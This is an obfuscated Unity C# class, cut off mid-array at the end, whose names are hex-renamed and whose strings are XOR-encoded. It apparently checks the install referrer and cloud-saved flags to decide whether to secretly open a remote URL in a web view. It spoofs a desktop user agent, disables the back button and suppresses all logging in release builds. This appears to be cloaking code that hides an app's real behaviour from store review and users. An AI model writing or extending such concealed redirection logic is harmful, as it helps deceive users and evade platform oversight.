using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x614c50eb : MonoBehaviour
{
    private void _0x635c034f()
    {
        if (_0x7bf23493 != null)
            return;
        var _0x6b21cc71 = _0x558e15c8();
        _0x7bf23493 = new GameObject(_0x581f7fed._0x77e9fe38(new byte[14] { 76, 126, 121, 77, 114, 126, 108, 72, 107, 114, 117, 117, 126, 105 }, 27), typeof(RectTransform), typeof(Text));
        _0xa91c9a08 = _0x7bf23493.GetComponent<RectTransform>();
        _0xa91c9a08.SetParent(_0x6b21cc71.transform, false);
        _0xa91c9a08.anchorMin = new Vector2(0.5f, 0.5f);
        _0xa91c9a08.anchorMax = new Vector2(0.5f, 0.5f);
        _0xa91c9a08.pivot = new Vector2(0.5f, 0.5f);
        _0xa91c9a08.sizeDelta = new Vector2(600f, 600f);
        _0xa91c9a08.anchoredPosition = Vector2.zero;
        _0x09cda234 = _0x7bf23493.GetComponent<Text>();
        _0x09cda234.text = _0x581f7fed._0x77e9fe38(new byte[1] { 158 }, 177);
        _0x09cda234.font = Resources.GetBuiltinResource<Font>(_0x581f7fed._0x77e9fe38(new byte[17] { 137, 160, 162, 164, 166, 188, 151, 176, 171, 177, 172, 168, 160, 235, 177, 177, 163 }, 197));
        _0x09cda234.fontSize = 200;
        _0x09cda234.alignment = TextAnchor.MiddleCenter;
        _0x09cda234.color = Color.white;
        _0x09cda234.raycastTarget = false;
        _0x7bf23493.SetActive(false);
    }

    private bool _0x7b7b708b = false;
    private Canvas _0x28abe308;
    private string _0x76a02cc6()
    {
        string _0x62c897be = _0x581f7fed._0x77e9fe38(new byte[62] { 144, 147, 146, 149, 148, 151, 150, 153, 152, 155, 154, 157, 156, 159, 158, 129, 128, 131, 130, 133, 132, 135, 134, 137, 136, 139, 176, 179, 178, 181, 180, 183, 182, 185, 184, 187, 186, 189, 188, 191, 190, 161, 160, 163, 162, 165, 164, 167, 166, 169, 168, 171, 193, 192, 195, 194, 197, 196, 199, 198, 201, 200 }, 241);
        System.Random _0xbf8b7bd9 = new System.Random();
        int _0xd6b15dd8 = _0xbf8b7bd9.Next(8, 16);
        return new string (Enumerable.Repeat(_0x62c897be, _0xd6b15dd8).Select(_0x1a20514d => _0x1a20514d[_0xbf8b7bd9.Next(_0x1a20514d.Length)]).ToArray());
    }

    private JObject _0x2585d8c2(params string[] _0x80de718f)
    {
        JObject _0x75f38345 = new JObject();
        foreach (var _0x2bded43a in _0x80de718f)
        {
            string _0x45f265f6 = _0x76a02cc6();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x45f265f6} val={_0x2bded43a}");
#endif
            }

            _0x75f38345.Add(_0x45f265f6, _0x2bded43a == null ? "" : _0x2bded43a);
        }

        return _0x75f38345;
    }

    private async Task<bool> _0x7a461df0(int _0x85103adc = 5, int _0xffb77298 = 500)
    {
        List<EntityData> _0xbe608345 = new List<EntityData>();
        int _0xd41d9cf9 = 0;
        do
        {
            try
            {
                _0xbe608345 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x581f7fed._0x77e9fe38(new byte[8] { 132, 152, 149, 141, 145, 134, 189, 144 }, 244), _0x5ab207e8, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x581f7fed._0x77e9fe38(new byte[9] { 148, 142, 173, 143, 148, 139, 156, 158, 132 }, 253) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x581f7fed._0x77e9fe38(new byte[32] { 41, 38, 23, 1, 6, 47, 82, 3, 7, 23, 0, 11, 51, 1, 11, 28, 17, 32, 23, 1, 7, 30, 6, 1, 82, 23, 0, 0, 29, 0, 72, 82 }, 114) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xffb77298);
        }
        while (_0xbe608345.Count == 0 && _0xd41d9cf9++ < _0x85103adc);
        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[32] { 207, 192, 241, 231, 224, 201, 180, 221, 231, 196, 230, 253, 226, 245, 247, 237, 180, 197, 225, 241, 230, 237, 180, 230, 241, 231, 225, 248, 224, 231, 174, 180 }, 148) + JsonConvert.SerializeObject(_0xbe608345, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[38] { 18, 29, 44, 58, 61, 20, 105, 0, 58, 25, 59, 32, 63, 40, 42, 48, 105, 24, 60, 44, 59, 48, 105, 59, 44, 58, 60, 37, 61, 58, 105, 42, 38, 60, 39, 61, 115, 105 }, 73) + _0xbe608345.Count);
            }
#endif
        }

        bool _0x146bbe5b = true;
        if (_0xbe608345.Count == 0)
        {
            _0x146bbe5b = false;
        }
        else
        {
            _0x146bbe5b = _0xbe608345.Any(_0xd9354190 => _0xd9354190.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[25] { 244, 251, 202, 220, 219, 242, 143, 230, 220, 255, 221, 198, 217, 206, 204, 214, 143, 221, 202, 220, 218, 195, 219, 149, 143 }, 175) + _0x146bbe5b);
            }
#endif
        }

        return _0x146bbe5b;
    }

    private bool _0x99140284()
    {
        var _0x381992b1 = Keyboard.current;
        return _0x381992b1 != null && _0x381992b1.escapeKey.wasPressedThisFrame;
    }

    private IEnumerator _0x162839ed()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[26] { 43, 36, 21, 3, 4, 45, 80, 57, 30, 25, 4, 25, 17, 28, 25, 10, 21, 34, 21, 22, 22, 21, 2, 21, 2, 80 }, 112));
            }
#endif
        }

        bool _0xaf3ff386 = false;
        InstallReferrer.GetReferrer((_0xd7a4624f) =>
        {
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[24] { 195, 204, 253, 235, 236, 184, 202, 253, 254, 253, 234, 234, 253, 234, 197, 184, 255, 253, 236, 184, 122, 30, 10, 184 }, 152) + _0x2efd6b96);
            if (_0xd7a4624f.IsSuccess)
            {
                _0x2efd6b96 = _0xd7a4624f.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[28] { 140, 131, 178, 164, 163, 247, 133, 178, 177, 178, 165, 165, 178, 165, 138, 247, 132, 162, 180, 180, 178, 164, 164, 247, 53, 81, 69, 247 }, 215) + _0x2efd6b96);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[27] { 234, 229, 212, 194, 197, 145, 227, 212, 215, 212, 195, 195, 212, 195, 236, 145, 247, 208, 216, 221, 212, 213, 145, 83, 55, 35, 145 }, 177) + _0xd7a4624f);
#endif
                }

                _0x2efd6b96 = "";
            }

            _0x178f9092 = true;
        });
        StartCoroutine(_0xfb915ef3(2f));
        yield return new WaitUntil(() => _0x178f9092);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x2efd6b96}");
#endif
        }

        bool _0xbca44da8 = _0x2efd6b96.Contains(_0x581f7fed._0x77e9fe38(new byte[6] { 196, 192, 207, 202, 199, 158 }, 163));
        _0xaf3ff386 = _0xbca44da8 || _0x2efd6b96.Contains(_0x581f7fed._0x77e9fe38(new byte[18] { 1, 16, 16, 19, 78, 9, 14, 19, 20, 1, 7, 18, 1, 13, 78, 3, 15, 13 }, 96)) || _0x2efd6b96.Contains(_0x581f7fed._0x77e9fe38(new byte[17] { 90, 75, 75, 72, 21, 93, 90, 88, 94, 89, 84, 84, 80, 21, 88, 84, 86 }, 59));
        _0x2fc2626c = _0xbca44da8 ? "" : (_0xaf3ff386 ? "" : _0x2fc2626c);
        _0x2fc2626c = _0x2fc2626c ?? "";
        _0xfae94595 = _0xfae94595 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x2fc2626c}");
#endif
        }
    }

    private void _0xc4dec3c4(string _0x3ae5f3b4)
    {
        bool _0x20db0ba5 = !string.IsNullOrEmpty(_0x3ae5f3b4);
        if (_0x20db0ba5)
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[13] { 104, 103, 86, 64, 71, 110, 19, 96, 91, 92, 68, 9, 19 }, 51) + _0x3ae5f3b4);
#endif
            }

            _0xd94a7164(_0x3ae5f3b4);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[39] { 96, 111, 94, 72, 79, 102, 27, 125, 90, 87, 87, 89, 90, 88, 80, 27, 217, 189, 169, 27, 124, 90, 86, 94, 27, 19, 85, 84, 27, 93, 82, 85, 90, 87, 27, 110, 105, 119, 18 }, 59));
#endif
            }

            _0xa47995de();
            return;
        }
    }

    private string _0xdbbbc131;
    // WEB VIEW LOGIC END
    internal void _0xf8596e9f()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0xceaa6faa = new AndroidNotificationChannel
        {
            Id = _0x581f7fed._0x77e9fe38(new byte[15] { 208, 209, 210, 213, 193, 216, 192, 235, 215, 220, 213, 218, 218, 209, 216 }, 180),
            Name = _0x581f7fed._0x77e9fe38(new byte[15] { 156, 189, 190, 185, 173, 180, 172, 248, 155, 176, 185, 182, 182, 189, 180 }, 216),
            Importance = Importance.High,
            Description = _0x581f7fed._0x77e9fe38(new byte[21] { 196, 230, 237, 230, 241, 226, 239, 163, 237, 236, 247, 234, 229, 234, 224, 226, 247, 234, 236, 237, 240 }, 131)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0xceaa6faa);
        // Build notification
        var _0xe0686744 = new AndroidNotification
        {
            Title = _0xdd2b150e[UnityEngine.Random.Range(0, _0xdd2b150e.Length)],
            Text = _0x581f7fed._0x77e9fe38(new byte[21] { 170, 153, 142, 203, 146, 132, 158, 203, 152, 158, 153, 142, 203, 159, 132, 203, 142, 147, 130, 159, 212 }, 235),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xe0686744, _0x581f7fed._0x77e9fe38(new byte[15] { 57, 56, 59, 60, 40, 49, 41, 2, 62, 53, 60, 51, 51, 56, 49 }, 93));
    }

    private IEnumerator _0xfb915ef3(float _0x5dc057e6)
    {
        yield return new WaitForSeconds(_0x5dc057e6);
        if (!_0x178f9092)
        {
            _0x178f9092 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x2efd6b96}");
                }
#endif
            }
        }
    }

    private async Task<bool> _0xf5f0354b()
    {
        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[29] { 215, 216, 233, 255, 248, 209, 172, 197, 255, 220, 254, 229, 250, 237, 239, 245, 205, 226, 232, 223, 237, 250, 233, 232, 207, 228, 233, 239, 231 }, 140));
#endif
        }

        string _0xe316de3a = "";
        for (int _0x1aeafa3d = 0; _0x1aeafa3d < 2; _0x1aeafa3d++)
        {
            if (await _0x7a461df0(1, 100))
            {
                await _0x5bea883c(_0x581f7fed._0x77e9fe38(new byte[7] { 11, 5, 6, 10, 2, 12, 13 }, 105));
                _0xa47995de();
                return true;
            }

            _0xe316de3a = await _0xe7ce4d31(1, 100);
            if (!string.IsNullOrEmpty(_0xe316de3a))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0xe316de3a))
            {
                if (!string.IsNullOrEmpty(_0xdbbbc131))
                {
                    _0xe316de3a = _0x5371514d(_0xe316de3a, _0xdbbbc131);
                    {
#if B_LOGS
                        Debug.Log(_0x581f7fed._0x77e9fe38(new byte[53] { 72, 71, 118, 96, 103, 78, 51, 80, 114, 112, 123, 118, 119, 51, 117, 122, 125, 114, 127, 70, 97, 127, 51, 100, 122, 103, 123, 51, 96, 118, 125, 119, 122, 119, 51, 241, 149, 129, 51, 96, 123, 124, 100, 51, 68, 118, 113, 69, 122, 118, 100, 41, 51 }, 19) + _0xe316de3a);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x581f7fed._0x77e9fe38(new byte[39] { 94, 81, 96, 118, 113, 88, 37, 70, 100, 102, 109, 96, 97, 37, 99, 108, 107, 100, 105, 80, 119, 105, 37, 231, 131, 151, 37, 118, 109, 106, 114, 37, 82, 96, 103, 83, 108, 96, 114 }, 5));
#endif
                    }
                }

                _0x696f0961 = true;
                _0xd94a7164(_0xe316de3a);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[44] { 162, 173, 156, 138, 141, 164, 217, 188, 129, 154, 156, 137, 141, 144, 150, 151, 217, 142, 145, 144, 149, 156, 217, 154, 145, 156, 154, 146, 144, 151, 158, 217, 138, 152, 143, 156, 157, 217, 149, 144, 151, 146, 195, 217 }, 249) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0x2efd6b96 = "";
    private void Awake()
    {
        if (_0x1021fa71 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x1021fa71 = gameObject.GetComponent<_0x614c50eb>();
        DontDestroyOnLoad(gameObject);
        _0xef613450 = _0x2fc2626c = _0xfae94595 = "";
        _0x20268b6d = "";
        _0xae32ae48 = false;
    }

    private string _0x06d4621c = "";
    private string _0x857682dc = "";
    private bool _0x5cb47f8a(string _0xd9196714)
    {
        try
        {
            using (var _0xd2824a22 = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 57, 53, 55, 116, 47, 52, 51, 46, 35, 105, 62, 116, 42, 54, 59, 35, 63, 40, 116, 15, 52, 51, 46, 35, 10, 54, 59, 35, 63, 40 }, 90)))
            using (var _0x1474b7b8 = _0xd2824a22.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 81, 71, 64, 64, 87, 92, 70, 115, 81, 70, 91, 68, 91, 70, 75 }, 50)))
            using (var _0x3a991ccf = _0x1474b7b8.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[17] { 142, 140, 157, 185, 136, 138, 130, 136, 142, 140, 164, 136, 135, 136, 142, 140, 155 }, 233)))
            using (var _0x33bfcf3e = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[22] { 53, 58, 48, 38, 59, 61, 48, 122, 55, 59, 58, 32, 49, 58, 32, 122, 29, 58, 32, 49, 58, 32 }, 84)))
            using (var _0x9203a884 = _0x33bfcf3e.CallStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[8] { 102, 119, 100, 101, 115, 67, 100, 127 }, 22), _0xd9196714, 1))
            {
                string _0x43ec1e90 = _0x9203a884.Call<string>(_0x581f7fed._0x77e9fe38(new byte[14] { 130, 128, 145, 182, 145, 151, 140, 139, 130, 160, 157, 145, 151, 132 }, 229), _0x581f7fed._0x77e9fe38(new byte[20] { 203, 219, 198, 222, 218, 204, 219, 246, 207, 200, 197, 197, 203, 200, 202, 194, 246, 220, 219, 197 }, 169));
                string _0x720682cb = _0x9203a884.Call<string>(_0x581f7fed._0x77e9fe38(new byte[10] { 185, 187, 170, 142, 191, 189, 181, 191, 185, 187 }, 222));
                _0x9203a884.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[11] { 173, 168, 168, 143, 173, 184, 169, 171, 163, 190, 181 }, 204), _0x581f7fed._0x77e9fe38(new byte[33] { 77, 66, 72, 94, 67, 69, 72, 2, 69, 66, 88, 73, 66, 88, 2, 79, 77, 88, 73, 75, 67, 94, 85, 2, 110, 126, 99, 123, 127, 109, 110, 96, 105 }, 44));
                _0x9203a884.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[11] { 197, 210, 218, 216, 193, 210, 242, 207, 195, 197, 214 }, 183), _0x581f7fed._0x77e9fe38(new byte[20] { 21, 5, 24, 0, 4, 18, 5, 40, 17, 22, 27, 27, 21, 22, 20, 28, 40, 2, 5, 27 }, 119));
                if (_0x9203a884.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 145, 134, 144, 140, 143, 149, 134, 162, 128, 151, 138, 149, 138, 151, 154 }, 227), _0x3a991ccf) != null)
                {
                    WLog(_0x581f7fed._0x77e9fe38(new byte[24] { 73, 98, 120, 101, 103, 111, 70, 99, 97, 111, 42, 101, 122, 111, 100, 42, 99, 100, 126, 111, 100, 126, 48, 42 }, 10) + _0xd9196714);
                    _0x9203a884.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[8] { 69, 64, 64, 98, 72, 69, 67, 87 }, 36), 0x10000000);
                    _0x1474b7b8.Call(_0x581f7fed._0x77e9fe38(new byte[13] { 158, 153, 140, 159, 153, 172, 142, 153, 132, 155, 132, 153, 148 }, 237), _0x9203a884);
                    return true;
                }

                if (_0xdab7109d(_0x720682cb))
                    return true;
                if (!string.IsNullOrEmpty(_0x43ec1e90))
                {
                    WLog(_0x581f7fed._0x77e9fe38(new byte[28] { 226, 201, 211, 206, 204, 196, 237, 200, 202, 196, 129, 200, 207, 213, 196, 207, 213, 129, 199, 192, 205, 205, 195, 192, 194, 202, 155, 129 }, 161) + _0x43ec1e90);
                    if (_0x30879500(_0x43ec1e90))
                        return _0xf39b9cfc(_0x43ec1e90, _0x720682cb);
                    return _0xb65ff173(_0x43ec1e90);
                }

                WLog(_0x581f7fed._0x77e9fe38(new byte[30] { 42, 1, 27, 6, 4, 12, 37, 0, 2, 12, 73, 0, 7, 29, 12, 7, 29, 73, 7, 6, 73, 1, 8, 7, 13, 5, 12, 27, 83, 73 }, 105) + _0xd9196714);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x581f7fed._0x77e9fe38(new byte[26] { 92, 119, 109, 112, 114, 122, 83, 118, 116, 122, 63, 118, 113, 107, 122, 113, 107, 63, 121, 126, 118, 115, 122, 123, 37, 63 }, 31) + e.Message);
            return true;
        }
    }

    internal bool ContainsIgnoreCase(string _0xc91b1120, string _0x4fffb703)
    {
        if (string.IsNullOrEmpty(_0xc91b1120) || string.IsNullOrEmpty(_0x4fffb703))
            return false;
        return _0xc91b1120.IndexOf(_0x4fffb703, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal Rect lastSafe = Rect.zero;
    private string _0x23a128a6 = "";
    private void WLog(string _0x46e68c69)
    {
#if B_LOGS
        {
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[7] { 96, 111, 94, 72, 79, 102, 27 }, 59) + _0x46e68c69);
        }
#endif
    }

    private async Task _0x5bea883c(string _0x96670194)
    {
        if (_0xee378b75 || string.IsNullOrEmpty(_0x5ab207e8) || string.IsNullOrEmpty(_0x96670194) || _0x696f0961)
            return;
        _0xee378b75 = true;
        try
        {
            JObject _0xcaf07a58 = _0x2585d8c2(_0x96670194, _0x5ab207e8, _0xe9832efe());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x96670194} payload: {_0xcaf07a58}");
                }
#endif
            }

            var _0x56ad6f64 = _0x0ddb8d03(_0xcaf07a58.ToString(), _0x5ab207e8);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x581f7fed._0x77e9fe38(new byte[4] { 190, 189, 179, 182 }, 210) + _0x5ab207e8, _0x56ad6f64 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[24] { 152, 151, 134, 144, 151, 158, 227, 143, 172, 162, 167, 227, 179, 162, 176, 176, 227, 166, 177, 177, 172, 177, 249, 227 }, 195) + e.Message);
#endif
            }
        }
    }

    private static bool IsPrivacyItemTrue(Item _0x88ddcebf)
    {
        if (_0x88ddcebf.Key != _0x581f7fed._0x77e9fe38(new byte[9] { 119, 109, 78, 108, 119, 104, 127, 125, 103 }, 30))
            return false;
        try
        {
            var _0xb64e291d = _0x88ddcebf.Value.GetAs<object>();
            return _0xb64e291d switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private bool _0xe53359ad()
    {
        var _0x7676dc58 = _0xd12ac465();
        if (_0x7676dc58 == null)
            return false;
        WLog(_0x581f7fed._0x77e9fe38(new byte[31] { 189, 148, 135, 145, 130, 148, 135, 144, 213, 151, 148, 150, 158, 213, 216, 203, 213, 133, 154, 133, 128, 133, 213, 178, 154, 183, 148, 150, 158, 207, 213 }, 245) + _0x7676dc58.Id);
        _0x7676dc58.GoBack();
        return true;
    }

    private async Task<string> _0xe7ce4d31(int _0x1b9aa208 = 5, int _0xfdb7d7a0 = 500)
    {
        try
        {
            List<EntityData> _0x4a22a95e = new List<EntityData>();
            int _0x5494eda1 = 0;
            do
            {
                _0x4a22a95e = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x581f7fed._0x77e9fe38(new byte[8] { 146, 142, 131, 155, 135, 144, 171, 134 }, 226), _0x5ab207e8, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x5ab207e8 }), new QueryOptions())).ToList();
                await Task.Delay(_0xfdb7d7a0);
            }
            while (_0x4a22a95e.Count == 0 && _0x5494eda1++ < _0x1b9aa208);
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[33] { 81, 94, 111, 121, 126, 87, 42, 89, 107, 124, 111, 110, 42, 70, 99, 100, 97, 42, 91, 127, 111, 120, 115, 42, 120, 111, 121, 127, 102, 126, 121, 48, 42 }, 10) + JsonConvert.SerializeObject(_0x4a22a95e, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[39] { 205, 194, 243, 229, 226, 203, 182, 197, 247, 224, 243, 242, 182, 218, 255, 248, 253, 182, 199, 227, 243, 228, 239, 182, 228, 243, 229, 227, 250, 226, 229, 182, 245, 249, 227, 248, 226, 172, 182 }, 150) + _0x4a22a95e.Count);
                }
#endif
            }

            var _0x01276421 = _0x4a22a95e.SelectMany(_0xd9354190 => _0xd9354190.Data).FirstOrDefault(_0x66236b02 => _0x66236b02.Key == _0x5ab207e8)?.Value.GetAs<string>() ?? string.Empty;
            _0x01276421 = Decrypt(_0x01276421, _0x5ab207e8);
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[24] { 158, 145, 160, 182, 177, 152, 229, 137, 170, 164, 161, 229, 182, 164, 179, 160, 161, 229, 169, 172, 171, 174, 255, 229 }, 197) + _0x01276421);
                }
#endif
            }

            return _0x01276421;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[39] { 51, 60, 13, 27, 28, 53, 72, 47, 13, 28, 72, 7, 26, 72, 24, 9, 26, 27, 13, 72, 27, 9, 30, 13, 12, 72, 4, 1, 6, 3, 72, 14, 9, 1, 4, 13, 12, 82, 72 }, 104) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private Task _0x616872e9(IEnumerator _0x31cbff5c)
    {
        var _0xa4a00c51 = new TaskCompletionSource<bool>();
        StartCoroutine(_0x617066af(_0x31cbff5c, _0xa4a00c51));
        return _0xa4a00c51.Task;
    }

    private void _0xd85a1fe7()
    {
        _0xbf1779c9 = true;
        if (_0xa3c94682 != null)
            _0xa3c94682.SetUserAgent(_0xbd48b76f());
    }

    private string _0x18a598fc = "";
    private bool _0x3c978867 = false;
    private void _0xd94a7164(string _0x46cc5063)
    {
        _0x10a20ee9();
        StartCoroutine(_0x08f4b0eb(_0x46cc5063));
    }

    private string _0x9140e84e = "";
    private bool _0xdab7109d(string _0x5543edc0)
    {
        if (string.IsNullOrEmpty(_0x5543edc0))
            return false;
        try
        {
            using (var _0x531d45dd = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 6, 10, 8, 75, 16, 11, 12, 17, 28, 86, 1, 75, 21, 9, 4, 28, 0, 23, 75, 48, 11, 12, 17, 28, 53, 9, 4, 28, 0, 23 }, 101)))
            using (var _0xfdccff5d = _0x531d45dd.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 232, 254, 249, 249, 238, 229, 255, 202, 232, 255, 226, 253, 226, 255, 242 }, 139)))
            using (var _0x3738897e = _0xfdccff5d.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[17] { 141, 143, 158, 186, 139, 137, 129, 139, 141, 143, 167, 139, 132, 139, 141, 143, 152 }, 234)))
            using (var _0x4d8cc5eb = _0x3738897e.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[25] { 10, 8, 25, 33, 12, 24, 3, 14, 5, 36, 3, 25, 8, 3, 25, 43, 2, 31, 61, 12, 14, 6, 12, 10, 8 }, 109), _0x5543edc0))
            {
                if (_0x4d8cc5eb == null)
                    return false;
                WLog(_0x581f7fed._0x77e9fe38(new byte[37] { 218, 241, 235, 246, 244, 252, 213, 240, 242, 252, 185, 245, 248, 236, 247, 250, 241, 185, 240, 247, 234, 237, 248, 245, 245, 252, 253, 185, 233, 248, 250, 242, 248, 254, 252, 163, 185 }, 153) + _0x5543edc0);
                _0x4d8cc5eb.Call<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[8] { 143, 138, 138, 168, 130, 143, 137, 157 }, 238), 0x10000000);
                _0xfdccff5d.Call(_0x581f7fed._0x77e9fe38(new byte[13] { 14, 9, 28, 15, 9, 60, 30, 9, 20, 11, 20, 9, 4 }, 125), _0x4d8cc5eb);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private void _0xd8be0b9e(string _0xb1ac0bad)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[34] { 221, 210, 227, 245, 242, 219, 166, 192, 227, 242, 229, 238, 166, 195, 254, 242, 244, 231, 166, 214, 243, 245, 238, 166, 194, 231, 242, 231, 166, 212, 231, 241, 188, 166 }, 134) + _0xb1ac0bad);
#endif
            }
        }

        var _0x869e5b9d = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xb1ac0bad);
        StartCoroutine(_0xc5fdaf69(_0x869e5b9d));
    }

    private void _0x20e7495a(UniWebView _0x5fb7975e)
    {
        _0x5fb7975e.BackgroundColor = Color.clear;
        _0x5fb7975e.SetSupportMultipleWindows(true, true);
        _0x5fb7975e.SetBackButtonEnabled(false);
        _0xa3c94682.SetUserAgent(_0xbd48b76f());
    }

    private string _0x8a767fe7()
    {
        return _0x581f7fed._0x77e9fe38(new byte[12] { 108, 34, 49, 42, 39, 48, 45, 43, 42, 108, 109, 63 }, 68) + _0x581f7fed._0x77e9fe38(new byte[8] { 180, 163, 176, 226, 183, 163, 255, 229 }, 194) + WindowsDesktopUserAgent + _0x581f7fed._0x77e9fe38(new byte[2] { 237, 241 }, 202) + _0x581f7fed._0x77e9fe38(new byte[30] { 142, 153, 138, 216, 136, 138, 151, 140, 151, 197, 182, 153, 142, 145, 159, 153, 140, 151, 138, 214, 136, 138, 151, 140, 151, 140, 129, 136, 157, 195 }, 248) + _0x581f7fed._0x77e9fe38(new byte[121] { 231, 244, 239, 226, 245, 232, 238, 239, 161, 229, 228, 231, 169, 238, 227, 235, 173, 234, 228, 248, 173, 247, 224, 237, 168, 250, 245, 243, 248, 250, 206, 227, 235, 228, 226, 245, 175, 229, 228, 231, 232, 239, 228, 209, 243, 238, 241, 228, 243, 245, 248, 169, 238, 227, 235, 173, 234, 228, 248, 173, 250, 230, 228, 245, 187, 231, 244, 239, 226, 245, 232, 238, 239, 169, 168, 250, 243, 228, 245, 244, 243, 239, 161, 247, 224, 237, 186, 252, 173, 226, 238, 239, 231, 232, 230, 244, 243, 224, 227, 237, 228, 187, 245, 243, 244, 228, 252, 168, 186, 252, 226, 224, 245, 226, 233, 169, 228, 168, 250, 252, 252 }, 129) + _0x581f7fed._0x77e9fe38(new byte[26] { 10, 11, 8, 70, 30, 28, 1, 26, 1, 66, 73, 27, 29, 11, 28, 47, 9, 11, 0, 26, 73, 66, 27, 15, 71, 85 }, 110) + _0x581f7fed._0x77e9fe38(new byte[130] { 99, 98, 97, 47, 119, 117, 104, 115, 104, 43, 32, 102, 119, 119, 81, 98, 117, 116, 110, 104, 105, 32, 43, 32, 50, 41, 55, 39, 47, 80, 110, 105, 99, 104, 112, 116, 39, 73, 83, 39, 54, 55, 41, 55, 60, 39, 80, 110, 105, 49, 51, 60, 39, 127, 49, 51, 46, 39, 70, 119, 119, 107, 98, 80, 98, 101, 76, 110, 115, 40, 50, 52, 48, 41, 52, 